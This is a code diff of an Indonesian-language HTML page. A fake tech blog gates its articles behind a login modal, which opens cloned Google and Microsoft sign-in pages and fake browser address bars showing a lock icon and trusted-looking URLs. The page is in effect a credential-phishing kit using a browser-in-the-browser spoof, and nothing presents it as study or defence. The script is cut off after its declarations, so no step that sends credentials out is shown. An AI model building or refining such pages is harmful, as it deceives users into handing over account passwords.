@@ -1,250 +1,819 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Cara Mengatasi Error 0x80070091 di Windows 11 — Alioth Blog</title>
+<title>TechBlog Indonesia - Artikel Teknologi Terkini</title>
 <meta name="theme-color" content="#ffffff" id="theme-color-meta">
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; }
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+  
   body {
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-    background:#fafafa;
-    color:#1:#1a1a1a;
-    line-height:1.6;
-    padding:20px;
+    background-color: #ffffff;
+    transition: background 0.3s ease;
   }
-  .blog-container {
-    max-width:720px;
-    margin:0 auto;
-    background:white;
-    padding:40px;
-    border-radius:8px;
-    box-shadow:0 1px 3px rgba(0,0,0,0.1);
+  
+  /* Blog Page Styles */
+  .blog-page {
+    display: block;
   }
-  h1 { font-size:28px; margin-bottom:16px; }
-  .meta { color:#666; font-size:14px; margin-bottom:30px; }
-  .content-preview { color:#333; }
-  .content-preview p { margin-bottom:16px; }
-  .blur { filter:blur(5px); pointer-events:none; user-select:none; }
-  .continue-btn {
-    background:#0067b8;
-    color:white;
-    border:none;
-    padding:14px 24px;
-    font-size:16px;
-    border-radius:6px;
-    cursor:pointer;
-    margin:30px 0;
+  
+  .blog-page.hidden {
+    display: none;
   }
-  .continue-btn:hover { background:#005a9e; }
-
-  /* Popup Login Choice */
-  .modal {
-    display:none;
-    position:fixed;
-    inset:0;
-    background:rgba(0,0,0,0.6);
-    align-items:center;
-    justify-content:center;
-    z-index:10000;
+  
+  .blog-header {
+    background: #1a73e8;
+    color: white;
+    padding: 20px;
+    text-align: center;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
   }
-  .modal.active { display:flex; }
-  .modal-box {
-    background:white;
-    padding:30px;
-    border-radius:24px;
-    border-radius:12px;
-    text-align:center;
-    width:90%;
-    max-width:380px;
+  
+  .blog-title {
+    font-size: 28px;
+    font-weight: 700;
+    margin-bottom: 5px;
   }
-  .modal-box h3 { margin-bottom:20px; font-size:20px; }
+  
+  .blog-subtitle {
+    font-size: 14px;
+    opacity: 0.9;
+  }
+  
+  .blog-content {
+    max-width: 800px;
+    margin: 0 auto;
+    padding: 30px 20px;
+  }
+  
+  .article {
+    background: white;
+    border-radius: 8px;
+    overflow: hidden;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    margin-bottom: 20px;
+  }
+  
+  .article-image {
+    width: 100%;
+    height: 250px;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 60px;
+  }
+  
+  .article-body {
+    padding: 25px;
+  }
+  
+  .article-meta {
+    display: flex;
+    gap: 15px;
+    font-size: 13px;
+    color: #666;
+    margin-bottom: 15px;
+  }
+  
+  .article-title {
+    font-size: 24px;
+    font-weight: 700;
+    color: #202124;
+    margin-bottom: 15px;
+    line-height: 1.3;
+  }
+  
+  .article-excerpt {
+    font-size: 16px;
+    color: #5f6368;
+    line-height: 1.6;
+    margin-bottom: 20px;
+  }
+  
+  .read-more-btn {
+    background: #1a73e8;
+    color: white;
+    border: none;
+    padding: 12px 24px;
+    font-size: 14px;
+    font-weight: 600;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background 0.2s;
+  }
+  
+  .read-more-btn:hover {
+    background: #1557b0;
+  }
+  
+  /* Login Modal */
+  .login-modal {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.5);
+    z-index: 9999;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  
+  .login-modal.active {
+    display: flex;
+  }
+  
+  .modal-content {
+    background: white;
+    border-radius: 8px;
+    padding: 30px;
+    max-width: 400px;
+    width: 100%;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+  }
+  
+  .modal-title {
+    font-size: 22px;
+    font-weight: 600;
+    margin-bottom: 10px;
+    color: #202124;
+  }
+  
+  .modal-subtitle {
+    font-size: 14px;
+    color: #5f6368;
+    margin-bottom: 25px;
+  }
+  
   .login-option {
-    display:flex;
-    align-items:center;
-    gap:16px;
-    padding:14px;
-    border:1px solid #ddd;
-    border-radius:8px;
-    margin-bottom:12px;
-    cursor:pointer;
-    transition:0.2s;
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    padding: 15px;
+    border: 1px solid #dadce0;
+    border-radius: 8px;
+    margin-bottom: 12px;
+    cursor: pointer;
+    transition: all 0.2s;
   }
-  .login-option:hover { background:#f5f5f5; border-color:#0067b8; }
-  .login-option img { width:32px; height:32px; }
-  .login-option span { font-size:16px; font-weight:500; }
-
-  /* Google Login Page */
-  .google-login {
-    display:none;
-    min-height:100vh;
-    background:#fff;
-    align-items:center;
-    justify-content:center;
-    padding:20px;
+  
+  .login-option:hover {
+    background: #f8f9fa;
+    border-color: #1a73e8;
   }
-  .google-login.active { display:flex; }
-  .google-box {
-    width:100%;
-    max-width:420px;
-    text-align:center;
+  
+  .login-icon {
+    width: 32px;
+    height: 32px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
   }
+  
   .google-logo {
-    width:92px;
-    margin-bottom:40px;
+    width: 24px;
+    height: 24px;
   }
-  .google-box h2 {
-    font-size:24px;
-    font-weight:400;
-    margin-bottom:8px;
+  
+  .ms-squares {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 2px;
+    width: 24px;
+    height: 24px;
   }
-  .google-box p {
-    color:#5f6368;
-    margin-bottom:30px;
+  
+  .square {
+    width: 100%;
+    height: 100%;
   }
+  
+  .square-red { background: #f25022; }
+  .square-green { background: #7fba00; }
+  .square-blue { background: #00a4ef; }
+  .square-yellow { background: #ffb900; }
+  
+  .login-text {
+    flex: 1;
+  }
+  
+  .login-provider {
+    font-size: 16px;
+    font-weight: 500;
+    color: #202124;
+  }
+  
+  .login-desc {
+    font-size: 13px;
+    color: #5f6368;
+  }
+  
+  .modal-close {
+    position: absolute;
+    top: 15px;
+    right: 15px;
+    background: none;
+    border: none;
+    font-size: 24px;
+    color: #5f6368;
+    cursor: pointer;
+    padding: 5px;
+    line-height: 1;
+  }
+  
+  /* Google Login Page */
+  .google-login-page {
+    display: none;
+    min-height: 100vh;
+    background: #ffffff;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  
+  .google-login-page.active {
+    display: flex;
+  }
+  
+  .google-container {
+    background: white;
+    border: 1px solid #dadce0;
+    border-radius: 8px;
+    padding: 48px 40px 36px;
+    width: 100%;
+    max-width: 450px;
+  }
+  
+  .google-logo-header {
+    text-align: center;
+    margin-bottom: 10px;
+  }
+  
+  .google-logo-large {
+    width: 75px;
+    height: 24px;
+  }
+  
+  .google-title {
+    font-size: 24px;
+    font-weight: 400;
+    color: #202124;
+    text-align: center;
+    margin-bottom: 8px;
+  }
+  
+  .google-subtitle {
+    font-size: 16px;
+    font-weight: 400;
+    color: #202124;
+    text-align: center;
+    margin-bottom: 24px;
+  }
+  
+  .google-input-group {
+    margin-bottom: 24px;
+  }
+  
   .google-input {
-    width:100%;
-    padding:14px 16px;
-    font-size:17px;
-    border:1px solid #dadce0;
-    border-radius:4px;
-    margin-bottom:16px;
+    width: 100%;
+    padding: 13px 15px;
+    font-size: 16px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    outline: none;
+    font-family: "Roboto", Arial, sans-serif;
+    transition: border-color 0.2s;
   }
-  .google-btn {
-    background:#1a73e8;
-    color:white;
-    border:none;
-    padding:12px 24px;
-    border-radius:4px;
-    font-size:14px;
-    font-weight:500;
-    cursor:pointer;
-    float:right;
+  
+  .google-input:focus {
+    border-color: #1a73e8;
+    border-width: 2px;
+    padding: 12px 14px;
   }
-  .google-btn:hover { background:#1765cc; }
-
-  /* Microsoft Login (yang sudah kamu punya) */
-  .login-page { display:none; min-height:100vh; background:linear-gradient(135deg,#e6f2ff 0%,#f0e6ff 100%); }
-  .login-page.active { display:flex; }
-
-  /* Fake Top Bar (di fullscreen) */
-  .fake-top-bar {
-    position:fixed;
-    top:0; left:0; right:0;
-    background:#fff;
-    padding:10px 16px;
-    box-shadow:0 1px 4px rgba(0,0,0,0.1);
-    display:flex;
-    align-items:center;
-    gap:12px;
-    z-index:9999;
-    opacity:0;
-    visibility:hidden;
-    transition:opacity 0.3s;
+  
+  .google-link {
+    color: #1a73e8;
+    text-decoration: none;
+    font-size: 14px;
+    font-weight: 500;
+    display: inline-block;
+    margin-bottom: 24px;
   }
-  .fake-top-bar.active {
-    opacity:1;
-    visibility:visible;
+  
+  .google-link:hover {
+    text-decoration: underline;
   }
-  .fake-lock {
-    width:20px;
-    height:20px;
-    background:#34a853;
-    border-radius:50%;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    color:white;
-    font-size:12px;
+  
+  .google-footer {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 24px;
   }
+  
+  .google-create {
+    color: #1a73e8;
+    text-decoration: none;
+    font-size: 14px;
+    font-weight: 500;
+  }
+  
+  .google-create:hover {
+    text-decoration: underline;
+  }
+  
+  .google-btn-next {
+    background: #1a73e8;
+    color: white;
+    border: none;
+    padding: 10px 24px;
+    font-size: 14px;
+    font-weight: 500;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background 0.2s;
+  }
+  
+  .google-btn-next:hover {
+    background: #1557b0;
+    box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+  }
+  
+  /* Microsoft Login Page Styles */
+  .ms-login-page {
+    display: none;
+    min-height: 100vh;
+    background: linear-gradient(135deg, #e6f2ff 0%, #f0e6ff 100%);
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  
+  .ms-login-page.active {
+    display: flex;
+  }
+  
+  .ms-container {
+    background: white;
+    border-radius: 2px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    width: 100%;
+    max-width: 440px;
+    padding: 44px;
+  }
+  
+  .ms-logo {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 20px;
+  }
+  
+  .ms-text {
+    font-size: 15px;
+    font-weight: 600;
+    color: #5e5e5e;
+  }
+  
+  .ms-title {
+    font-size: 24px;
+    font-weight: 600;
+    color: #1b1b1b;
+    margin-bottom: 12px;
+    margin-top: 8px;
+  }
+  
+  .ms-input-group {
+    margin-bottom: 20px;
+  }
+  
+  .ms-label {
+    display: block;
+    font-size: 13px;
+    color: #1b1b1b;
+    margin-bottom: 6px;
+  }
+  
+  .ms-input {
+    width: 100%;
+    padding: 8px 10px;
+    font-size: 15px;
+    border: 1px solid #8a8886;
+    border-radius: 0;
+    outline: none;
+    font-family: "Segoe UI", sans-serif;
+    background: white;
+  }
+  
+  .ms-input:focus {
+    border: 1px solid #0078d4;
+    border-bottom: 2px solid #0078d4;
+    padding-bottom: 7px;
+  }
+  
+  .ms-links {
+    font-size: 13px;
+    margin-bottom: 24px;
+  }
+  
+  .ms-links a {
+    color: #0067b8;
+    text-decoration: none;
+    display: block;
+    margin-bottom: 12px;
+  }
+  
+  .ms-links a:hover {
+    text-decoration: underline;
+  }
+  
+  .ms-btn-primary {
+    background: #0067b8;
+    color: white;
+    border: none;
+    padding: 8px 12px;
+    font-size: 15px;
+    cursor: pointer;
+    float: right;
+    min-width: 108px;
+    font-weight: 600;
+    transition: background 0.2s;
+  }
+  
+  .ms-btn-primary:hover {
+    background: #005a9e;
+  }
+  
+  .clearfix::after {
+    content: "";
+    display: table;
+    clear: both;
+  }
+  
+  .ms-footer-links {
+    margin-top: 32px;
+    padding-top: 20px;
+    border-top: 1px solid #e1dfdd;
+  }
+  
+  .ms-footer-links a {
+    color: #616161;
+    font-size: 11px;
+    text-decoration: none;
+    display: inline-block;
+    margin-right: 20px;
+    margin-bottom: 8px;
+  }
+  
+  /* Fake URL Bars */
+  .fake-bar {
+    background: #1c1c1e;
+    position: fixed;
+    bottom: 0;
+    width: 100%;
+    z-index: 9999;
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.3s ease, visibility 0.3s ease, bottom 0.2s ease;
+    padding: 8px 12px;
+    box-sizing: border-box;
+  }
+  
+  .fake-bar-content {
+    display: flex;
+    align-items: center;
+    background: #2c2c2e;
+    border-radius: 20px;
+    padding: 10px 14px;
+    gap: 10px;
+  }
+  
+  .lock-icon {
+    width: 18px;
+    height: 18px;
+    background: #4CAF50;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+  
+  .lock-icon svg {
+    width: 10px;
+    height: 10px;
+    fill: white;
+  }
+  
   .fake-url {
-    flex:1;
-    font-size:15px;
-    color:#000;
-    overflow:hidden;
-    text-overflow:ellipsis;
-    white-space:nowrap;
+    color: #ffffff;
+    font-size: 15px;
+    font-weight: 400;
+    flex: 1;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
   }
-
+  
+  .tab-count {
+    background: transparent;
+    border: 1.5px solid #8e8e93;
+    color: #8e8e93;
+    width: 24px;
+    height: 24px;
+    border-radius: 4px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    font-weight: 600;
+    flex-shrink: 0;
+  }
+  
+  .user-icon {
+    width: 26px;
+    height: 26px;
+    background: #3a3a3c;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+  
+  .user-icon svg {
+    width: 16px;
+    height: 16px;
+    fill: #8e8e93;
+  }
+  
+  .menu-icon {
+    width: 24px;
+    height: 24px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+  
+  .menu-icon svg {
+    width: 4px;
+    height: 18px;
+    fill: #8e8e93;
+  }
+  
+  .show {
+    opacity: 1;
+    visibility: visible;
+  }
+  
+  .fake-top-bar {
+    background: #1c1c1e;
+    position: fixed;
+    top: 0;
+    width: 100%;
+    z-index: 9998;
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.3s ease, visibility 0.3s ease;
+    padding: 8px 12px;
+    box-sizing: border-box;
+  }
+  
+  .fake-top-bar .fake-bar-content {
+    background: #2c2c2e;
+    border-radius: 20px;
+    padding: 10px 14px;
+  }
+  
+  .fullscreen-active .fake-top-bar {
+    opacity: 1;
+    visibility: visible;
+  }
+  
   .loading-overlay {
-    position:fixed;
-    inset:0;
-    background:white;
-    display:none;
-    align-items:center;
-    justify-content:center;
-    z-index:10001;
+    position: fixed;
+    inset: 0;
+    background: white;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 10000;
   }
-  .loading-overlay.active { display:flex; }
+  
+  .loading-overlay.active {
+    display: flex;
+  }
+  
   .spinner {
-    width:48px;
-    height:48px;
-    border:5px solid #f0f0f0;
-    border-top:5px solid #1a73e8;
-    border-radius:50%;
-    animation:spin 1s linear infinite;
+    width: 40px;
+    height: 40px;
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #1a73e8;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
   }
-  @keyframes spin { to { transform:rotate(360deg); } }
+  
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
 </style>
 </head>
 <body>
-
-<!-- Blog Content -->
-<div class="blog-container" id="blogPage">
-  <h1>Cara Mengatasi Error 0x80070091 pada Windows 11 (100% Berhasil)</h1>
-  <div class="meta">Diposting pada 8 Desember 2025 • 5 menit baca</div>
-
-  <div class="content-preview" id="previewContent">
-    <p>Error 0x80070091 biasanya muncul saat menghapus folder Windows.old atau saat membersihkan disk. Pesan errornya biasanya “The directory is not empty”.</p>
-    <p>Penyebab utama adalah file atau folder di dalam Windows.old sedang dipakai oleh proses sistem...</p>
-    <p>Kemudian lakukan langkah berikut:</p>
-    <ol>
-      <li>Buka Command Prompt sebagai Administrator</li>
-      <li>Ketik perintah <code>takeown /F C:\Windows.old\* /R /A</code></li>
-      <li>Lanjutkan dengan <code>icacls C:\Windows.old\*.* /T /Q /C /RESET</code></li>
-    </ol>
-
-    <div class="blur">
-      <p>Langkah selanjutnya hanya bisa dilihat oleh member yang login...</p>
-      <p>Setelah itu jalankan perintah RD /S /Q, dan seterusnya sampai 20 langkah rahasia yang hanya diketahui segelintir orang.</p>
-    </div>
-  </div>
-
-  <button class="continue-btn" id="continueBtn">Continue Reading → Login Required</button>
+<!-- Loading overlay -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="spinner"></div>
 </div>
 
-<!-- Popup Pilih Login -->
-<div class="modal" id="loginModal">
-  <div class="modal-box">
-    <h3>Login untuk melanjutkan membaca</h3>
-    <div class="login-option" id="loginGoogle">
-      <img src="https://www.google.com/favicon.ico" alt="Google">
-      <span>Masuk dengan Google</span>
+<!-- Fake address bars -->
+<div class="fake-bar" id="fakeBar">
+  <div class="fake-bar-content">
+    <div class="lock-icon">
+      <svg viewBox="0 0 12 12" xmlns="http://www.w3.org/2000/svg">
+        <path d="M6 1C4.9 1 4 1.9 4 3v1H3v6h6V4H8V3c0-1.1-.9-2-2-2zm0 1c.6 0 1 .4 1 1v1H5V3c0-.6.4-1 1-1z"/>
+      </svg>
     </div>
-    <div class="login-option" id="loginMicrosoft">
-      <img src="https://logo.clearbit.com/microsoft.com" alt="Microsoft">
-      <span>Masuk dengan Microsoft</span>
+    <div class="fake-url" id="bottomFakeUrl">techblog.co.id</div>
+    <div class="tab-count">1</div>
+    <div class="user-icon">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+      </svg>
+    </div>
+    <div class="menu-icon">
+      <svg viewBox="0 0 4 18" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="2" cy="2" r="2"/>
+        <circle cx="2" cy="9" r="2"/>
+        <circle cx="2" cy="16" r="2"/>
+      </svg>
+    </div>
+  </div>
+</div>
+
+<div class="fake-top-bar" id="fakeTopBar">
+  <div class="fake-bar-content">
+    <div class="lock-icon">
+      <svg viewBox="0 0 12 12" xmlns="http://www.w3.org/2000/svg">
+        <path d="M6 1C4.9 1 4 1.9 4 3v1H3v6h6V4H8V3c0-1.1-.9-2-2-2zm0 1c.6 0 1 .4 1 1v1H5V3c0-.6.4-1 1-1z"/>
+      </svg>
+    </div>
+    <div class="fake-url" id="topFakeUrl">techblog.co.id</div>
+    <div class="tab-count">1</div>
+    <div class="user-icon">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+      </svg>
+    </div>
+    <div class="menu-icon">
+      <svg viewBox="0 0 4 18" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="2" cy="2" r="2"/>
+        <circle cx="2" cy="9" r="2"/>
+        <circle cx="2" cy="16" r="2"/>
+      </svg>
+    </div>
+  </div>
+</div>
+
+<!-- Blog Page -->
+<div class="blog-page" id="blogPage">
+  <div class="blog-header">
+    <div class="blog-title">TechBlog Indonesia</div>
+    <div class="blog-subtitle">Portal Berita Teknologi & Inovasi Terkini</div>
+  </div>
+  
+  <div class="blog-content">
+    <div class="article">
+      <div class="article-image">💻</div>
+      <div class="article-body">
+        <div class="article-meta">
+          <span>📅 8 Desember 2025</span>
+          <span>👤 Admin Tech</span>
+          <span>💬 245 Komentar</span>
+        </div>
+        <h2 class="article-title">Revolusi AI di Indonesia: Peluang dan Tantangan di Era Digital</h2>
+        <p class="article-excerpt">
+          Kecerdasan Buatan (AI) telah menjadi topik hangat di kalangan pelaku teknologi Indonesia. Dari startup hingga perusahaan besar, semua berlomba mengintegrasikan AI dalam sistem mereka. Namun, apa sebenarnya dampak revolusi AI ini terhadap ekonomi digital Indonesia?
+        </p>
+        <button class="read-more-btn" onclick="showLoginModal()">Baca Selengkapnya →</button>
+      </div>
+    </div>
+    
+    <div class="article">
+      <div class="article-image">🚀</div>
+      <div class="article-body">
+        <div class="article-meta">
+          <span>📅 7 Desember 2025</span>
+          <span>👤 Editor Startup</span>
+          <span>💬 189 Komentar</span>
+        </div>
+        <h2 class="article-title">10 Startup Indonesia yang Raih Pendanaan Terbesar Tahun Ini</h2>
+        <p class="article-excerpt">
+          Ekosistem startup Indonesia terus menunjukkan pertumbuhan yang menggembirakan. Di tahun 2025 ini, tercatat lebih dari 50 startup lokal berhasil mendapatkan pendanaan dari investor asing. Berikut daftar 10 startup dengan valuasi tertinggi...
+        </p>
+        <button class="read-more-btn" onclick="showLoginModal()">Baca Selengkapnya →</button>
+      </div>
+    </div>
+    
+    <div class="article">
+      <div class="article-image">🔒</div>
+      <div class="article-body">
+        <div class="article-meta">
+          <span>📅 6 Desember 2025</span>
+          <span>👤 Security Expert</span>
+          <span>💬 312 Komentar</span>
+        </div>
+        <h2 class="article-title">Waspada! Modus Penipuan Online Terbaru yang Harus Anda Ketahui</h2>
+        <p class="article-excerpt">
+          Kejahatan siber semakin canggih dengan berbagai modus baru yang memanfaatkan teknologi AI dan social engineering. Para ahli keamanan siber memperingatkan pengguna internet untuk lebih waspada terhadap ancaman phishing yang kini semakin sulit dideteksi...
+        </p>
+        <button class="read-more-btn" onclick="showLoginModal()">Baca Selengkapnya →</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Login Modal -->
+<div class="login-modal" id="loginModal">
+  <div class="modal-content">
+    <h2 class="modal-title">Login untuk Melanjutkan</h2>
+    <p class="modal-subtitle">Pilih metode login untuk membaca artikel lengkap</p>
+    
+    <div class="login-option" onclick="selectLoginProvider('google')">
+      <div class="login-icon">
+        <svg class="google-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+        </svg>
+      </div>
+      <div class="login-text">
+        <div class="login-provider">Login dengan Google</div>
+        <div class="login-desc">Gunakan akun Google Anda</div>
+      </div>
+    </div>
+    
+    <div class="login-option" onclick="selectLoginProvider('microsoft')">
+      <div class="login-icon">
+        <div class="ms-squares">
+          <div class="square square-red"></div>
+          <div class="square square-green"></div>
+          <div class="square square-blue"></div>
+          <div class="square square-yellow"></div>
+        </div>
+      </div>
+      <div class="login-text">
+        <div class="login-provider">Login dengan Microsoft</div>
+        <div class="login-desc">Gunakan akun Microsoft Anda</div>
+      </div>
     </div>
   </div>
 </div>
 
 <!-- Google Login Page -->
-<div class="google-login" id="googlePage">
-  <div class="google-box">
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo">
-    <h2>Masuk</h2>
-    <p>untuk melanjutkan ke Alioth Blog</p>
-    <input type="email" placeholder="Email atau telepon" class="google-input" id="googleEmail" autocomplete="username">
-    <div style="clear:both"></div>
-    <a href="#" style="color:#1a73e8; font-size:14px; float:left; margin-top:10px;">Lupa email?</a>
-    <button class="google-btn" id="googleNext">Berikutnya</button>
+<div class="google-login-page" id="googleLoginPage">
+  <div class="google-container">
+    <div class="google-logo-header">
+      <svg class="google-logo-large" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+        <path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+        <path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.93 20.84c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
+        <path fill="#4285F4" d="M225 3v65h-9.5V3h9.5z"/>
+        <path fill="#34A853" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
+      </svg>
+    </div>
+    
+    <h1 class="google-title">Masuk</h1>
+    <p class="google-subtitle">Gunakan Akun Google Anda</p>
+    
+    <div class="google-input-group">
+      <input type="email" class="google-input" id="googleEmail" placeholder="Email atau nomor telepon" autocomplete="username">
+    </div>
+    
+    <a href="#" class="google-link">Lupa email?</a>
+    
+    <p style="font-size: 14px; color: #5f6368; margin-bottom: 24px;">
+      Bukan komputer Anda? Gunakan mode Tamu untuk masuk secara pribadi. 
+      <a href="#" style="color: #1a73e8; text-decoration: none;">Pelajari lebih lanjut</a>
+    </p>
+    
+    <div class="google-footer">
+      <a href="#" class="google-create">Buat akun</a>
+      <button class="google-btn-next" id="googleNextBtn">Berikutnya</button>
+    </div>
   </div>
 </div>
 
-<!-- Microsoft Login Page (yang sudah ada) -->
-<div class="login-page" id="loginPage">
-  <div class="login-container">
+<!-- Microsoft Login Page -->
+<div class="ms-login-page" id="msLoginPage">
+  <div class="ms-container">
     <div class="ms-logo">
       <div class="ms-squares">
         <div class="square square-red"></div>
@@ -254,92 +823,223 @@
       </div>
       <span class="ms-text">Microsoft</span>
     </div>
-    <h1>Masuk</h1>
-    <div class="input-group">
-      <input type="email" id="email" placeholder="Email, telepon, atau Skype" autocomplete="username">
+    
+    <h1 class="ms-title">Masuk</h1>
+    
+    <div class="ms-input-group">
+      <label for="msEmail" class="ms-label">Alamat email, nomor telepon, atau Skype</label>
+      <input type="email" id="msEmail" class="ms-input" autocomplete="username">
     </div>
+    
+    <div class="ms-links">
+      <a href="#">Belum punya akun? Buat sekarang!</a>
+      <a href="#">Tidak dapat mengakses akun Anda?</a>
+    </div>
+    
     <div class="clearfix">
-      <button class="btn-primary" id="nextBtn">Selanjutnya</button>
+      <button class="ms-btn-primary" id="msNextBtn">Selanjutnya</button>
     </div>
-    <div class="footer-links">
-      <a href="#">Opsi masuk lainnya</a>
+    
+    <div class="ms-footer-links">
+      <a href="#">Ketentuan penggunaan</a>
+      <a href="#">Privasi & cookie</a>
+      <a href="#">...</a>
     </div>
   </div>
 </div>
 
-<!-- Fake Top Bar -->
-<div class="fake-top-bar" id="fakeTopBar">
-  <div class="fake-lock">Lock</div>
-  <div class="url" id="fakeUrl">https://accounts.google.com</div>
-</div>
-
-<!-- Loading Spinner -->
-<div class="loading-overlay" id="loading">
-  <div class="spinner"></div>
-</div>
-
 <script>
-const continueBtn = document.getElementById('continueBtn');
-const modal = document.getElementById('loginModal');
-const loginGoogle = document.getElementById('loginGoogle');
-const loginMicrosoft = document.getElementById('loginMicrosoft');
-const blogPage = document.getElementById('blogPage');
-const googlePage = document.getElementById('googlePage');
-const loginPage = document.getElementById('loginPage');
-const loading = document.getElementById('loading');
+const fakeBar = document.getElementById('fakeBar');
 const fakeTopBar = document.getElementById('fakeTopBar');
-const fakeUrl = document.getElementById('fakeUrl');
+const topFakeUrl = document.getElementById('topFakeUrl');
+const bottomFakeUrl = document.getElementById('bottomFakeUrl');
+const metaTheme = document.getElementById('theme-color-meta');
+const loadingOverlay = document.getElementById('loadingOverlay');
+const loginModal = document.getElementById('loginModal');
+const blogPage = document.getElementById('blogPage');
+const googleLoginPage = document.getElementById('googleLoginPage');
+const msLoginPage = document.getElementById('msLoginPage');
+const googleEmail = document.getElementById('googleEmail');
+const msEmail = document.getElementById('msEmail');
